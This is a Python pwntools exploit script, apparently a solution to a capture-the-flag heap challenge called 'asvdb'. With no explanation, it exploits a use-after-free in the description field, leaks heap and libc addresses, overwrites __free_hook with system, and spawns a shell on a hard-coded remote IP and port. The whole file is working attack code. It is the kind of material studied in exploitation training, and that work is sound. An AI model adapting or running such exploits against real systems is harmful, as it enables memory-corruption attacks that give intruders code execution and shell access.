from pwn import *
from time import sleep

def alloc(year, id_, title, desc_size, desc, severity):
	r.sendlineafter('> ', '1')
	r.sendlineafter('year: ', str(year))
	r.sendlineafter('id: ', str(id_))
	r.sendlineafter('): ', title)
	r.sendlineafter('size: ', str(desc_size))
	if desc_size <= 0xff:
		r.sendlineafter('description: ', desc)
	r.sendlineafter('): ', str(severity))

def free(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter('index: ', str(idx))

def show(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter('index: ', str(idx))

def get_heap(idx):
	show(idx)
	r.recvuntil('Description: ')
	return u64(r.recv(3).ljust(8, chr(0)))

def get_libc(idx):
	show(idx)
	r.recvuntil('title: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc(1, 2, 'lel', 0x10, 'chunk_0', 3) # 0
	alloc(3, 4, 'lel', 0x10, 'chunk_1', 3) # 1
	alloc(0, 0, 'lel', 0x60, 'chunk_2', 3) # 2
	alloc(0, 0, 'lel', 0x60, 'chunk_3', 3) # 3
	alloc(0, 0, 'lel', 0x60, 'chunk_4', 3) # 4

	free(0)
	free(1)

	# description UAF by entering an invalid desciption size (i.e > 0xFF)
	alloc(20, 20, 'kek', 0x200, '', 2)

	heap = get_heap(0) - 0x310
	log.success('Heap: 0x{:x}'.format(heap))

	free(0)

	puts_got = 0x601fa8

	alloc(1, 2, 'lel', 0x10, p64(heap + 0x3d0), 3)

	free(3)
	free(4)

	alloc(1, 2, 'lel', 0x10, p64(0xb00bface), 3) # 1
	alloc(1, 2, 'lel', 0x18, p64(0) + p32(puts_got), 3)
	alloc(1, 2, 'lel', 0x70, p64(0xdeadbeef), 3)

	libc = get_libc(2) - 0x00000000000809c0
	system = libc + 0x4f440
	__malloc_hook = libc + 0x3ebc30
	__free_hook = libc + 0x3ed8e8

	log.success('Libc: 0x{:x}'.format(libc))

	free(3)
	free(4)
	free(1)

	alloc(20, 20, 'kek', 0x200, '', 2)

	free(1)

	alloc(1, 2, 'sh\x00', 0x10, p64(__free_hook), 3) # 1
	alloc(1, 2, 'sh\x00', 0x10, 'idk', 3) 
	alloc(1, 2, 'sh\x00', 0x10, p64(system), 3) 

	free(1)

	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == "r":
		r = remote('37.139.17.37', 1337)
	else:	
		r = process('./asvdb')
		pause()
	pwn()
